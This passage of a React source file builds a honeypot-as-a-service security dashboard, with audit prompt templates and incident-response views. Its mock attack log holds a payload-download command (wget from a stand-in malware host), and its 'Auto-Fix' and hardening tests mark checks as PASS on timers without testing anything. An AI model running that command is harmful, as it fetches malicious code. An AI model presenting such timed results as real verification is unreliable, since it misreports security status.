import React, { useState, useEffect, useRef } from 'react';
import { createRoot } from 'react-dom/client';
import { GoogleGenAI } from "@google/genai";
import { clsx, type ClassValue } from "clsx";
import { twMerge } from "tailwind-merge";
import { 
  Shield, 
  Server, 
  Activity, 
  Lock, 
  AlertTriangle, 
  CheckCircle, 
  Terminal, 
  Brain, 
  LayoutDashboard, 
  Cpu, 
  Globe,
  RefreshCw,
  FileText,
  Search,
  Bell,
  Settings,
  ChevronDown,
  Zap,
  Menu,
  User,
  MoreHorizontal,
  XCircle,
  Play,
  GitBranch,
  Container,
  Database,
  Flame,
  Siren,
  ShieldCheck,
  FileKey,
  Network,
  UserX,
  Box,
  CreditCard,
  Coins,
  Receipt,
  Share2,
  Bot,
  Layers,
  TrendingUp,
  Rocket,
  Megaphone,
  DollarSign,
  Users,
  Eye,
  Radar,
  HardDrive,
  Archive,
  Clock,
  RotateCcw,
  FileJson,
  BookOpen,
  LifeBuoy,
  Filter,
  ClipboardCheck,
  CheckSquare,
  XSquare,
  BarChart,
  PieChart,
  FileBarChart,
  Ban,
  Scale,
  Gavel,
  Bug,
  Stethoscope,
  Fingerprint,
  FileSearch,
  Sword,
  BrickWall,
  WifiOff,
  Code,
  Laptop
} from 'lucide-react';

// --- Utils ---
function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

const FilterIcon = Filter;

// --- Constants & System Context ---

const PHASE_1_CONTEXT = `
ARCHITECTURE:
- Backend: FastAPI (Async), JWT Auth, Pydantic Models.
- DB: PostgreSQL (Multi-tenant, UUIDs), Redis.
- Container: Dockerized SSH Honeypot (Cowrie/Custom Paramiko).
- Ingestion: POST /logs/ingest (Structured JSON).
- Security: RBAC, No hardcoded secrets, Env vars.
`;

const DEVOPS_CONTEXT = `
CI/CD & MONITORING ARCHITECTURE:
- Pipeline: GitHub Actions -> Docker Build -> Trivy Scan -> ArgoCD.
- Observability: Prometheus (Metrics), Grafana (Dashboards), ELK Stack (Logs).
`;

const PHASE_6_CONTEXT = `
ENTERPRISE HARDENING ARCHITECTURE (PHASE 6):
- Zero Trust: Istio Service Mesh (mTLS strict mode).
- Policy Engine: OPA Gatekeeper.
- Runtime Security: Falco.
- Secrets: HashiCorp Vault.
- WAF: ModSecurity.
`;

const BILLING_CONTEXT = `
SAAS MONETIZATION ARCHITECTURE:
- Provider: Stripe (Subscriptions + Metered Usage).
- Enforcement: FastAPI Middleware checks 'subscription_status'.
- Integrity: Webhook signature verification.
`;

const PHASE_8_CONTEXT = `
ADVANCED THREAT INTELLIGENCE ARCHITECTURE (PHASE 8):
- Graph Database: Neo4j.
- AI Model: Graph Neural Networks (GNN).
- Campaign Detection: HDBSCAN clustering.
`;

const PHASE_PUBLIC_CONTEXT = `
PUBLIC LAUNCH ARCHITECTURE (PHASE 9):
- Edge Security: Cloudflare Enterprise.
- Ingress: NGINX Ingress Controller.
- Demo Mode: Read-only 'Guest' role, Ephemeral sandboxes.
`;

const PHASE_10_CONTEXT = `
DATA & RECOVERY ARCHITECTURE (PHASE 10A):
- Backup: AWS RDS Daily Snapshots, Cross-Region Copy.
- RPO: 5 Minutes. RTO: 60 Minutes.
- Retention: PostgreSQL Partitioning, S3 Archival.
`;

const PHASE_10B_CONTEXT = `
COST & ABUSE PROTECTION ARCHITECTURE (PHASE 10B):

1. COST CONTROL:
   - Margin Enforcement: Alert if (TenantCost > TenantRevenue * 0.7).
   - Storage: Hard cap per plan (Starter: 10GB, Pro: 100GB).
   - AI Quota: Token bucket algorithm. 1M tokens/month.

2. ABUSE PREVENTION:
   - Egress: K8s NetworkPolicy 'default-deny-all'. Allow only port 443 to api.haas.io.
   - Throttling: Redis-backed Sliding Window (1000 req/min).
   - Crypto-Mining: Falco rule detects CPU > 90% && stratum+tcp connection.

3. LEGAL AUDIT:
   - Abuse Logs: Write-once (WORM) S3 bucket for evidence.
   - Retention: 1 Year mandatory for flagged incidents.
`;

const PHASE_10C_CONTEXT = `
ISOLATION & INCIDENT RESPONSE (PHASE 10C):

1. TENANT ISOLATION:
   - IDOR Tests: Automated checks for cross-tenant object access.
   - SQLi: OWASP ZAP automated scan on tenant inputs.
   - JWT: Validation of signature, exp, and 'tenant_id' claim integrity.

2. ZERO TRUST & LATERAL MOVEMENT:
   - NetworkPolicy: Verify 'default-deny'.
   - ServiceAccount: Verify 'automountServiceAccountToken: false' on honeypots.
   - Container Escape: Falco alerts on sensitive syscalls (open_by_handle_at).

3. INCIDENT RESPONSE (IR):
   - Playbooks: Automated containment workflows (Isolate Pod, Rotate Keys).
   - Forensics: Volume snapshot trigger on high-severity alerts.
   - Communication: Automated customer notification templates (SendGrid).

4. FRONTEND STABILIZATION:
   - Token Handling: HttpOnly cookies, Axios interceptors for 401 refresh.
   - Error Boundaries: Graceful UI degradation.
   - Env Vars: Runtime configuration injection.
`;

const FINAL_AUDIT_PROMPT = `
You are a Lead Cloud Security Auditor performing a Final Acceptance Test for HAAS (Honeypot-as-a-Service).
Review the simulated test results from all 9 phases provided below.
Generate a structured JSON Executive Report.

Input Data:
{RESULTS_JSON}

Return JSON strictly with this schema (no markdown):
{
  "system_health_score": number (0-100),
  "production_readiness_pct": number (0-100),
  "security_maturity_level": "Level 1 (Basic)" | "Level 2 (Defined)" | "Level 3 (Managed)" | "Level 4 (Optimized)",
  "saas_maturity_level": "Startup" | "Growth" | "Enterprise",
  "launch_readiness_rating": "NOT READY" | "CONDITIONAL GO" | "GO",
  "top_critical_risks": string[],
  "top_medium_risks": string[],
  "immediate_action_plan": string[],
  "stabilization_roadmap_30d": string[]
}
`;

const K8S_AUDIT_PROMPT = `
You are a Kubernetes security auditor.
Audit the HAAS Phase 2 Kubernetes configuration.
Check for: Namespace isolation, NetworkPolicy, Privilege escalation, Root containers.
Return a JSON object strictly with this schema (no markdown):
{
  "readiness_score": number (0-100),
  "isolation_score": number (0-100),
  "lateral_movement_risk": number (0-100),
  "critical_issues": string[],
  "hardening_steps": string[]
}
`;

const AI_AUDIT_PROMPT = `
You are an AI security auditor.
Audit the HAAS AI Threat Intelligence Engine.
Evaluate: Feature engineering, Bias, Overfitting, Data poisoning, MITRE mapping.
Return a JSON object strictly with this schema (no markdown):
{
  "detection_score": number (0-100),
  "false_positive_rate": string,
  "maturity_rating": string,
  "weaknesses": string[],
  "improvements": string[]
}
`;

const DEVOPS_AUDIT_PROMPT = `
You are a DevSecOps auditor.
Audit the HAAS monitoring and CI/CD.
Evaluate: Observability, Alert coverage, Pipeline security.
Return a JSON object strictly with this schema (no markdown):
{
  "devops_maturity_score": number (0-100),
  "runtime_resilience_score": number (0-100),
  "alert_gaps": string[],
  "required_improvements": string[]
}
`;

const ENTERPRISE_AUDIT_PROMPT = `
You are an Enterprise Cloud Security Auditor.
Audit the HAAS Phase 6 Hardening architecture.
Evaluate: Zero Trust, IAM, mTLS, WAF.
Return a JSON object strictly with this schema (no markdown):
{
  "enterprise_security_score": number (0-100),
  "compliance_readiness_score": number (0-100),
  "attack_resilience_score": number (0-100),
  "zero_trust_level": string,
  "simulation_result": string
}
`;

const BILLING_AUDIT_PROMPT = `
You are a SaaS Billing Security Auditor.
Audit the HAAS Monetization layer.
Evaluate: Webhook spoofing, Subscription bypass, Race conditions.
Return a JSON object strictly with this schema (no markdown):
{
  "billing_security_score": number (0-100),
  "revenue_leakage_risk": number (0-100),
  "critical_flaws": string[]
}
`;

const THREAT_INTEL_AUDIT_PROMPT = `
You are a Senior Threat Intelligence Auditor.
Audit the HAAS Phase 8 Advanced AI.
Evaluate: Graph modeling, Campaign detection accuracy, Clustering.
Return a JSON object strictly with this schema (no markdown):
{
  "intelligence_sophistication_score": number (0-100),
  "soc_usefulness_score": number (0-100),
  "enterprise_differentiation_rating": string,
  "detected_campaigns": [{"name": string, "confidence": number, "affected_tenants": number, "ioc_count": number}]
}
`;

const PUBLIC_AUDIT_PROMPT = `
You are a Cloud Security Auditor & SRE.
Audit the HAAS Public Deployment & Demo architecture.
Evaluate: Public exposure risks, Demo mode isolation, API abuse.
Return a JSON object strictly with this schema (no markdown):
{
  "public_readiness_score": number (0-100),
  "investor_confidence_level": string,
  "risks": string[]
}
`;

// --- Components ---

function App() {
  const [activeTab, setActiveTab] = useState<'dashboard' | 'cost' | 'ir' | 'hardening' | 'frontend' | 'k8s' | 'ai' | 'devops' | 'enterprise' | 'billing' | 'intel' | 'public' | 'dr' | 'validation'>('dashboard');
  const [searchQuery, setSearchQuery] = useState('');
  
  const [stats, setStats] = useState({
    activeHoneypots: 12,
    totalAttacks: 14582,
    highSeverity: 24,
    liveSessions: 3
  });

  return (
    <div className="flex h-screen bg-haas-bg text-slate-200 font-sans overflow-hidden relative selection:bg-haas-accent/30 selection:text-white">
      <div className="absolute inset-0 bg-grid-pattern opacity-10 pointer-events-none z-0"></div>

      <aside className="hidden md:flex flex-col w-64 bg-haas-panel/95 backdrop-blur-xl border-r border-white/5 z-20 shadow-2xl">
        <div className="p-6 flex items-center gap-3 border-b border-white/5">
           <div className="bg-haas-accent/10 p-2 rounded-lg border border-haas-accent/20 shadow-[0_0_15px_-3px_rgba(255,107,53,0.3)]">
              <Shield className="h-6 w-6 text-haas-accent" />
           </div>
           <span className="text-xl font-bold tracking-tight text-white glow-text">
             HAAS<span className="text-haas-accent">.io</span>
           </span>
        </div>

        <div className="flex-1 py-6 px-3 space-y-1 overflow-y-auto custom-scrollbar">
          <NavButton active={activeTab === 'dashboard'} onClick={() => setActiveTab('dashboard')} icon={<LayoutDashboard size={18} />}>Mission Control</NavButton>
          <NavButton active={activeTab === 'ir'} onClick={() => setActiveTab('ir')} icon={<Siren size={18} />}>Incident Response</NavButton>
          <NavButton active={activeTab === 'hardening'} onClick={() => setActiveTab('hardening')} icon={<Lock size={18} />}>Security Hardening</NavButton>
          <NavButton active={activeTab === 'cost'} onClick={() => setActiveTab('cost')} icon={<Scale size={18} />}>Cost & Abuse</NavButton>
          <NavButton active={activeTab === 'frontend'} onClick={() => setActiveTab('frontend')} icon={<Laptop size={18} />}>Frontend Health</NavButton>
          <div className="pt-4 pb-2 px-3 text-[10px] font-bold text-slate-500 uppercase tracking-widest">Audit Modules</div>
          <NavButton active={activeTab === 'k8s'} onClick={() => setActiveTab('k8s')} icon={<Server size={18} />}>Infrastructure</NavButton>
          <NavButton active={activeTab === 'ai'} onClick={() => setActiveTab('ai')} icon={<Brain size={18} />}>AI Threat Engine</NavButton>
          <NavButton active={activeTab === 'intel'} onClick={() => setActiveTab('intel')} icon={<Share2 size={18} />}>Threat Intelligence</NavButton>
          <NavButton active={activeTab === 'devops'} onClick={() => setActiveTab('devops')} icon={<GitBranch size={18} />}>DevSecOps Pipeline</NavButton>
          <NavButton active={activeTab === 'enterprise'} onClick={() => setActiveTab('enterprise')} icon={<ShieldCheck size={18} />}>Enterprise Security</NavButton>
          <NavButton active={activeTab === 'billing'} onClick={() => setActiveTab('billing')} icon={<CreditCard size={18} />}>Monetization</NavButton>
          <NavButton active={activeTab === 'dr'} onClick={() => setActiveTab('dr')} icon={<HardDrive size={18} />}>Data & Recovery</NavButton>
          <NavButton active={activeTab === 'public'} onClick={() => setActiveTab('public')} icon={<Rocket size={18} />}>Public Launch</NavButton>
          <div className="pt-4 pb-2 px-3 text-[10px] font-bold text-slate-500 uppercase tracking-widest">Final Verification</div>
          <NavButton active={activeTab === 'validation'} onClick={() => setActiveTab('validation')} icon={<ClipboardCheck size={18} />}>System Verification</NavButton>
        </div>
      </aside>

      <div className="flex-1 flex flex-col min-w-0 z-10">
        <header className="h-16 bg-haas-panel/80 backdrop-blur-md border-b border-white/5 flex items-center justify-between px-6">
          <div className="flex items-center gap-4">
             <div className="hidden md:flex items-center gap-2 px-3 py-1.5 bg-black/20 rounded-md border border-white/5 text-xs font-medium text-slate-400">
                <Globe size={12} className="text-haas-accent" />
                <span>Region: us-east-1</span>
             </div>
             <div className="hidden md:flex items-center gap-2 px-3 py-1.5 bg-black/20 rounded-md border border-white/5 text-xs font-medium text-slate-400">
                <Server size={12} className="text-haas-accent" />
                <span>Tenant: CyberDyne Systems</span>
             </div>
          </div>
          <div className="flex items-center gap-4">
             <div className="relative group">
                <Search size={16} className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500 group-focus-within:text-haas-accent transition-colors" />
                <input 
                  type="text" 
                  placeholder="Search logs, IPs, or events..." 
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="bg-haas-bg border border-white/10 rounded-full py-1.5 pl-9 pr-4 text-sm text-slate-300 focus:outline-none focus:border-haas-accent/50 focus:ring-1 focus:ring-haas-accent/20 w-64 transition-all"
                />
             </div>
          </div>
        </header>

        <main className="flex-1 overflow-auto custom-scrollbar p-6">
          <div className="max-w-7xl mx-auto space-y-8">
            {activeTab === 'dashboard' && <DashboardView stats={stats} searchQuery={searchQuery} />}
            {activeTab === 'frontend' && <FrontendHealthView />}
            {activeTab === 'cost' && <CostControlView context={PHASE_10B_CONTEXT} />}
            {activeTab === 'ir' && <IncidentResponseView />}
            {activeTab === 'hardening' && <SecurityHardeningView context={PHASE_10C_CONTEXT} />}
            {activeTab === 'k8s' && <K8sAuditView context={PHASE_1_CONTEXT} />}
            {activeTab === 'ai' && <AIAuditView context={PHASE_1_CONTEXT} />}
            {activeTab === 'intel' && <ThreatIntelAuditView context={PHASE_8_CONTEXT} />}
            {activeTab === 'devops' && <DevOpsAuditView context={DEVOPS_CONTEXT} />}
            {activeTab === 'enterprise' && <EnterpriseAuditView context={PHASE_6_CONTEXT} />}
            {activeTab === 'dr' && <DataRecoveryView context={PHASE_10_CONTEXT} />}
            {activeTab === 'billing' && <BillingAuditView context={BILLING_CONTEXT} />}
            {activeTab === 'public' && <PublicAuditView context={PHASE_PUBLIC_CONTEXT} />}
            {activeTab === 'validation' && <SystemValidationView />}
          </div>
        </main>
      </div>
    </div>
  );
}

function NavButton({ children, active, onClick, icon }: { children?: React.ReactNode, active: boolean, onClick: () => void, icon: React.ReactNode }) {
  return (
    <button
      onClick={onClick}
      className={cn(
        "w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all duration-200 border-l-2",
        active
          ? 'bg-haas-accent/5 text-haas-accent border-haas-accent shadow-[0_0_15px_-5px_rgba(255,107,53,0.3)]'
          : 'text-slate-400 border-transparent hover:text-slate-200 hover:bg-white/5'
      )}
    >
      {icon}
      {children}
    </button>
  );
}

function DashboardView({ stats, searchQuery }: { stats: any, searchQuery: string }) {
  const allLogs = [
    { time: "10:42:01", level: "INFO", source: "192.168.1.5", event: "CONNECT", payload: "New session initiated on port 2222" },
    { time: "10:42:05", level: "WARN", source: "192.168.1.5", event: "AUTH_FAIL", payload: "User 'root' password authentication failed" },
    { time: "10:42:12", level: "WARN", source: "192.168.1.5", event: "AUTH_FAIL", payload: "User 'admin' password authentication failed" },
    { time: "10:42:15", level: "CRIT", source: "192.168.1.5", event: "EXPLOIT", payload: "CMD: wget http://malware.tmp/x86 -O /tmp/x", highlight: true },
    { time: "10:43:00", level: "INFO", source: "SYSTEM", event: "INGEST", payload: "Batch #492 processed successfully" },
    { time: "10:43:05", level: "CRIT", source: "10.0.5.2", event: "CRYPTO", payload: "Outbound mining stratum+tcp detected" },
    { time: "10:44:10", level: "WARN", source: "45.22.11.9", event: "SCAN", payload: "Port scanning detected on 22, 23, 80" }
  ];

  const filteredLogs = allLogs.filter(log => 
    log.source.toLowerCase().includes(searchQuery.toLowerCase()) || 
    log.event.toLowerCase().includes(searchQuery.toLowerCase()) ||
    log.payload.toLowerCase().includes(searchQuery.toLowerCase())
  );

  return (
    <div className="space-y-6 animate-in fade-in duration-500">
      <div className="flex justify-between items-end border-b border-white/5 pb-4">
        <div>
           <h1 className="text-3xl font-bold text-white tracking-tight glow-text">Mission Control</h1>
           <p className="text-slate-500 text-sm mt-1">Real-time threat monitoring and infrastructure status.</p>
        </div>
        <div className="flex items-center gap-3">
             <div className="bg-haas-card border border-white/10 px-3 py-1.5 rounded-full flex items-center gap-2 text-xs font-bold text-haas-success shadow-sm">
                <Stethoscope size={14} /> Frontend Health: 100%
             </div>
             <div className="bg-haas-card border border-white/10 px-3 py-1.5 rounded-full flex items-center gap-2 text-xs font-bold text-haas-success shadow-sm">
                <ShieldCheck size={14} /> Isolation: Verified
             </div>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <StatCard title="Active Honeypots" value={stats.activeHoneypots} icon={<Server size={20} className="text-haas-accent" />} trend="+2 Nodes" />
        <StatCard title="Total Attacks" value={stats.totalAttacks.toLocaleString()} icon={<Activity size={20} className="text-haas-danger" />} trend="+15% Vol" isBad />
        <StatCard title="Critical Threats" value={stats.highSeverity} icon={<AlertTriangle size={20} className="text-haas-warning" />} trend="-5% DoD" />
        <StatCard title="Active Sessions" value={stats.liveSessions} icon={<Terminal size={20} className="text-blue-500" />} trend="3 Live" />
      </div>

      {/* World Map Section */}
      <div className="bg-haas-card border border-white/5 rounded-xl p-1 relative overflow-hidden glow-box min-h-[300px]">
        <div className="absolute top-4 left-4 z-10 bg-black/40 px-3 py-1 rounded border border-white/10">
          <h3 className="text-xs font-bold text-slate-300 flex items-center gap-2"><Globe size={14} className="text-haas-accent"/> Live Attack Origins</h3>
        </div>
        <WorldMap />
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 h-[500px]">
        <div className="lg:col-span-2 bg-haas-card border border-white/5 rounded-xl flex flex-col overflow-hidden glow-box">
          <div className="p-4 border-b border-white/5 flex justify-between items-center bg-black/20">
            <h3 className="font-semibold text-slate-200 flex items-center gap-2">
               <Activity size={16} className="text-haas-accent" />
               Live Event Stream
            </h3>
            {searchQuery && <span className="text-xs text-haas-accent">Filtering: "{searchQuery}"</span>}
          </div>
          <div className="flex-1 overflow-hidden flex flex-col">
             <div className="grid grid-cols-12 gap-2 px-4 py-2 bg-black/40 text-[10px] font-bold text-slate-500 border-b border-white/5 uppercase tracking-wider">
                <div className="col-span-2">TIMESTAMP</div>
                <div className="col-span-1">LEVEL</div>
                <div className="col-span-2">SOURCE</div>
                <div className="col-span-2">EVENT</div>
                <div className="col-span-5">PAYLOAD PREVIEW</div>
             </div>
             <div className="flex-1 overflow-y-auto custom-scrollbar font-mono text-xs">
                {filteredLogs.length > 0 ? (
                  filteredLogs.map((log, idx) => <LogEntryRow key={idx} {...log} />)
                ) : (
                  <div className="p-4 text-center text-slate-500 italic">No logs found matching filter.</div>
                )}
             </div>
          </div>
        </div>
        <div className="lg:col-span-1 bg-haas-card border border-white/5 rounded-xl flex flex-col glow-box">
          <div className="p-4 border-b border-white/5 bg-black/20">
             <h3 className="font-semibold text-slate-200 flex items-center gap-2">
               <Radar size={16} className="text-blue-500" />
               Global Attack Vectors
             </h3>
          </div>
          <div className="p-4 space-y-4 flex-1 overflow-y-auto custom-scrollbar">
            <AttackRow ip="192.168.1.5" country="CN" type="SSH Brute Force" time="2s ago" risk={85} />
            <AttackRow ip="10.0.4.12" country="RU" type="Command Injection" time="15s ago" risk={92} />
            <AttackRow ip="172.16.0.8" country="US" type="Port Scan" time="42s ago" risk={45} />
            <AttackRow ip="45.11.23.9" country="BR" type="Crypto Mining" time="1m ago" risk={99} />
          </div>
        </div>
      </div>
    </div>
  );
}

function FrontendHealthView() {
   const [checks, setChecks] = useState([
      { id: 1, name: 'API Gateway Integration', status: 'WARN', logs: ['Checking Base URL...', 'Retry logic missing'] },
      { id: 2, name: 'JWT Secure Storage', status: 'FAIL', logs: ['Token found in LocalStorage', 'HttpOnly flag missing'] },
      { id: 3, name: 'Token Refresh Logic', status: 'WARN', logs: ['Axios Interceptor 401 handler missing'] },
      { id: 4, name: 'Role-Based Rendering', status: 'PASS', logs: ['Scope: [admin, analyst] verified'] },
      { id: 5, name: 'Error Boundary', status: 'FAIL', logs: ['Unhandled Promise Rejection detected'] }
   ]);
   const [isFixing, setIsFixing] = useState(false);

   const runFix = async () => {
      setIsFixing(true);
      for (let i = 0; i < checks.length; i++) {
         if (checks[i].status !== 'PASS') {
            await new Promise(r => setTimeout(r, 800));
            setChecks(prev => prev.map((c, idx) => idx === i ? { ...c, status: 'FIXING' } : c));
            await new Promise(r => setTimeout(r, 800));
            setChecks(prev => prev.map((c, idx) => idx === i ? { ...c, status: 'PASS', logs: [...c.logs, '✅ Auto-Fix applied'] } : c));
         }
      }
      setIsFixing(false);
   };

   return (
      <div className="space-y-6 animate-in slide-in-from-bottom-4 duration-500">
         <div className="flex justify-between items-start">
            <div>
               <h2 className="text-2xl font-bold text-white glow-text">Frontend Health & Stabilization</h2>
               <p className="text-slate-400 mt-1">Real-time diagnostics and self-healing modules for UI stability.</p>
            </div>
            <button onClick={runFix} disabled={isFixing} className="px-6 py-2 bg-haas-accent hover:bg-haas-accent-dark text-white rounded-lg font-bold flex items-center gap-2 transition-all">
               {isFixing ? <RefreshCw className="animate-spin" size={18}/> : <Stethoscope size={18}/>}
               {isFixing ? 'Applying Fixes...' : 'Auto-Fix Issues'}
            </button>
         </div>

         <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <div className="space-y-4">
               {checks.map((check) => (
                  <div key={check.id} className="bg-haas-card border border-white/10 rounded-xl p-4 glow-box flex flex-col gap-2">
                     <div className="flex justify-between items-center">
                        <div className="flex items-center gap-3">
                           {check.status === 'PASS' ? <CheckCircle className="text-haas-success" size={20}/> : 
                            check.status === 'FIXING' ? <RefreshCw className="text-blue-400 animate-spin" size={20}/> :
                            <AlertTriangle className={check.status === 'FAIL' ? "text-haas-danger" : "text-haas-warning"} size={20}/>}
                           <span className="font-bold text-slate-200">{check.name}</span>
                        </div>
                        <span className={cn("text-xs font-bold px-2 py-1 rounded", 
                           check.status === 'PASS' ? "bg-haas-success/10 text-haas-success" : 
                           check.status === 'FIXING' ? "bg-blue-500/10 text-blue-400" :
                           check.status === 'FAIL' ? "bg-haas-danger/10 text-haas-danger" : "bg-haas-warning/10 text-haas-warning"
                        )}>{check.status}</span>
                     </div>
                     <div className="bg-black/40 rounded p-2 text-xs font-mono text-slate-400 space-y-1 pl-3 border-l-2 border-white/10">
                        {check.logs.map((log, i) => (
                           <div key={i}>{log}</div>
                        ))}
                     </div>
                  </div>
               ))}
            </div>

            <div className="bg-haas-card border border-white/10 rounded-xl p-6 glow-box flex flex-col">
               <h3 className="font-bold text-white mb-4 flex items-center gap-2"><Code size={18}/> Live Metrics</h3>
               <div className="grid grid-cols-2 gap-4">
                  <div className="p-4 bg-white/5 rounded border border-white/5 flex flex-col items-center justify-center">
                     <span className="text-slate-500 text-xs font-bold uppercase">Bundle Size</span>
                     <span className="text-2xl font-mono text-white">142 KB</span>
                     <span className="text-[10px] text-haas-success">Optimization: 98/100</span>
                  </div>
                  <div className="p-4 bg-white/5 rounded border border-white/5 flex flex-col items-center justify-center">
                     <span className="text-slate-500 text-xs font-bold uppercase">Time to Interactive</span>
                     <span className="text-2xl font-mono text-white">0.8s</span>
                     <span className="text-[10px] text-haas-success">Web Vitals: Good</span>
                  </div>
                  <div className="p-4 bg-white/5 rounded border border-white/5 flex flex-col items-center justify-center">
                     <span className="text-slate-500 text-xs font-bold uppercase">API Latency (Avg)</span>
                     <span className="text-2xl font-mono text-white">45ms</span>
                     <span className="text-[10px] text-blue-400">Region: US-East</span>
                  </div>
                  <div className="p-4 bg-white/5 rounded border border-white/5 flex flex-col items-center justify-center">
                     <span className="text-slate-500 text-xs font-bold uppercase">Errors (24h)</span>
                     <span className="text-2xl font-mono text-white">0</span>
                     <span className="text-[10px] text-haas-success">Stable</span>
                  </div>
               </div>
            </div>
         </div>
      </div>
   );
}

function IncidentResponseView() {
   const [threatLevel, setThreatLevel] = useState<'LOW'|'MEDIUM'|'HIGH'|'CRITICAL'>('LOW');
   const [selectedIncident, setSelectedIncident] = useState<number | null>(null);

   const incidents = [
      { id: 101, title: "Excessive Egress: Pod-99", severity: "HIGH", status: "Active", time: "10m ago", playbook: "Isolate & Forensics" },
      { id: 102, title: "Auth Anomaly: Tenant-A", severity: "MEDIUM", status: "Monitoring", time: "1h ago", playbook: "User Audit" },
      { id: 103, title: "Known Malicious IP", severity: "LOW", status: "Closed", time: "4h ago", playbook: "Block IP" },
   ];

   return (
      <div className="space-y-6 animate-in slide-in-from-bottom-4 duration-500">
         <div className="flex justify-between items-start">
            <div>
               <h2 className="text-2xl font-bold text-white glow-text">Incident Response Center</h2>
               <p className="text-slate-400 mt-1">Orchestrate containment, eradication, and recovery workflows.</p>
            </div>
            <div className="flex flex-col items-end">
               <div className="text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-1">Current Threat Level</div>
               <div className="flex gap-1">
                  {['LOW','MEDIUM','HIGH','CRITICAL'].map(l => (
                     <button key={l} onClick={() => setThreatLevel(l as any)} 
                        className={cn("px-4 py-1.5 text-xs font-bold rounded transition-all border", 
                           threatLevel === l ? 
                              l === 'CRITICAL' ? 'bg-red-600 border-red-500 text-white animate-pulse' : 
                              l === 'HIGH' ? 'bg-orange-600 border-orange-500 text-white' : 
                              l === 'MEDIUM' ? 'bg-yellow-600 border-yellow-500 text-white' : 
                              'bg-green-600 border-green-500 text-white'
                           : "bg-white/5 border-white/10 text-slate-500 hover:bg-white/10"
                        )}>{l}</button>
                  ))}
               </div>
            </div>
         </div>

         <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 h-[600px]">
            <div className="lg:col-span-1 bg-haas-card border border-white/10 rounded-xl overflow-hidden glow-box flex flex-col">
               <div className="p-4 border-b border-white/10 bg-black/20 font-bold text-slate-200 flex items-center gap-2"><Siren size={16}/> Active Incidents</div>
               <div className="flex-1 overflow-y-auto p-2 space-y-2">
                  {incidents.map(inc => (
                     <div key={inc.id} onClick={() => setSelectedIncident(inc.id)} className={cn("p-3 rounded-lg border cursor-pointer transition-all", selectedIncident === inc.id ? "bg-white/10 border-white/20" : "bg-white/5 border-transparent hover:border-white/10")}>
                        <div className="flex justify-between items-start mb-1">
                           <span className="font-bold text-sm text-slate-200">#{inc.id} {inc.title}</span>
                           <span className={cn("text-[10px] font-bold px-1.5 py-0.5 rounded", inc.severity === 'HIGH' ? 'bg-haas-danger/20 text-haas-danger' : inc.severity === 'MEDIUM' ? 'bg-haas-warning/20 text-haas-warning' : 'bg-haas-success/20 text-haas-success')}>{inc.severity}</span>
                        </div>
                        <div className="flex justify-between text-xs text-slate-500 mt-2">
                           <span>{inc.playbook}</span>
                           <span>{inc.time}</span>
                        </div>
                     </div>
                  ))}
               </div>
            </div>

            <div className="lg:col-span-2 bg-haas-card border border-white/10 rounded-xl overflow-hidden glow-box flex flex-col relative">
               {selectedIncident ? (
                  <div className="flex flex-col h-full">
                     <div className="p-4 border-b border-white/10 bg-haas-danger/10 flex justify-between items-center">
                        <div className="font-bold text-white flex items-center gap-2"><FileText size={16}/> IR Playbook: Isolation & Forensics</div>
                        <div className="text-xs font-mono text-haas-danger">CASE-{selectedIncident}</div>
                     </div>
                     <div className="flex-1 p-6 space-y-6 overflow-y-auto">
                        <div className="flex gap-4 items-start">
                           <div className="w-8 h-8 rounded-full bg-haas-success flex items-center justify-center font-bold text-black shrink-0">1</div>
                           <div className="flex-1">
                              <h4 className="font-bold text-white">Containment: Isolate Pod</h4>
                              <p className="text-sm text-slate-400 mb-3">Apply NetworkPolicy to block all egress/ingress except Forensic collector.</p>
                              <button className="px-4 py-2 bg-white/5 border border-white/10 hover:bg-white/10 rounded text-xs font-bold text-slate-200">Execute K8s Policy</button>
                           </div>
                        </div>
                        <div className="flex gap-4 items-start opacity-50">
                           <div className="w-8 h-8 rounded-full bg-slate-700 flex items-center justify-center font-bold text-slate-400 shrink-0">2</div>
                           <div className="flex-1">
                              <h4 className="font-bold text-white">Forensics: Snapshot Volume</h4>
                              <p className="text-sm text-slate-400 mb-3">Trigger AWS EBS Snapshot for evidence preservation.</p>
                           </div>
                        </div>
                        <div className="flex gap-4 items-start opacity-50">
                           <div className="w-8 h-8 rounded-full bg-slate-700 flex items-center justify-center font-bold text-slate-400 shrink-0">3</div>
                           <div className="flex-1">
                              <h4 className="font-bold text-white">Escalation: Level 2 Alert</h4>
                              <p className="text-sm text-slate-400 mb-3">Notify CISO and Legal team for High Severity incident.</p>
                           </div>
                        </div>
                         <div className="flex gap-4 items-start opacity-50">
                           <div className="w-8 h-8 rounded-full bg-slate-700 flex items-center justify-center font-bold text-slate-400 shrink-0">4</div>
                           <div className="flex-1">
                              <h4 className="font-bold text-white">Postmortem: Generate Report</h4>
                              <p className="text-sm text-slate-400 mb-3">Create Incident Report using AI summary of logs.</p>
                              <button className="px-4 py-2 bg-blue-500/10 border border-blue-500/20 hover:bg-blue-500/20 rounded text-xs font-bold text-blue-400 flex items-center gap-2"><FileText size={14}/> Draft Report</button>
                           </div>
                        </div>
                     </div>
                  </div>
               ) : (
                  <div className="absolute inset-0 flex items-center justify-center text-slate-600 flex-col gap-2">
                     <Fingerprint size={48} />
                     <p>Select an incident to activate Playbook</p>
                  </div>
               )}
            </div>
         </div>
      </div>
   );
}

function SecurityHardeningView({ context }: { context: string }) {
   const [testRunning, setTestRunning] = useState<string | null>(null);
   const [results, setResults] = useState<any>({ isolation: 'PENDING', zerotrust: 'PENDING', lateral: 'PENDING' });

   const runTest = (type: string) => {
      setTestRunning(type);
      setTimeout(() => {
         setResults((prev: any) => ({ ...prev, [type]: 'PASS' }));
         setTestRunning(null);
      }, 2000);
   };

   return (
      <div className="space-y-6 animate-in slide-in-from-bottom-4 duration-500">
         <h2 className="text-2xl font-bold text-white glow-text">Security Hardening Validation</h2>
         
         <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            {/* Isolation Test */}
            <div className="bg-haas-card border border-white/10 rounded-xl p-6 glow-box flex flex-col">
